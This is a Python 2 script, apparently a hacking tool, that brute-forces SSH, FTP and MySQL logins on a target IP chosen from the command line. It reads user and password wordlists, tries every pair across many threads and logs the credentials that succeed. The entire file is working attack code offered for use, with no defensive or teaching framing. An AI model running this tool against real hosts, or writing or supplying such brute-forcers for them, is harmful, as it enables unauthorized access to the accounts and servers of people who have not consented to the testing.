#!/usr/bin/env python
# -*- coding: utf-8 -*-
#py2
'this script can bruter ftp/ssh/mysql'

__author__ = 'reber'

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    """docstring for CommonFun"""
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print "###################################################################"
            for x in rlist:
                self.show_log(lname,x)
        else:
            print "not found..."

#################SSH爆破模块#################
class SshBruter(CommonFun):
    """docstring for SshBruter"""
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(':')
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,"Timeout...")
                    self.qlist.put(name + ':' + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = "[Error] %s:%s" % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print "Exit the program..."
        print "Waiting..."
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print "Used time: %f" % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    """docstring for FtpBruter"""
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = "[OK] %s:%s" % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout...")
                self.qlist.put(name + ':' + pwd)
                time.sleep(1)
            except Exception, e:
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print "Exit the program..."
        print "Waiting..."
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print "Used time: %f" % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    """docstring for MysqlBruter"""
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db='mysql', port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = "[OK] %s:%s" % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
            except Exception, e:
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print "Exit the program..."
        print "Waiting..."
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print "Used time: %f" % (finishetime-starttime)

def main():
    parser = OptionParser(usage='Usage: python %prog [options] type')
    parser.add_option('-i','--host',dest='host',help='target ip')
    parser.add_option('-o','--timeout',type=int,dest='timeout',default=5,help='timeout')
    parser.add_option('-t','--thread',type=int,dest='threadnum',default=10,help='threadnum')
    parser.add_option('-L','--userfile',dest='userfile',default='username.txt',help='userfile')
    parser.add_option('-P','--passfile',dest='passfile',default='password.txt',help='passfile')

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]=='ssh':
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]=='ftp':
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]=='mysql':
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print "type must be ssh or ftp or mysql"

if __name__ == '__main__':
    main()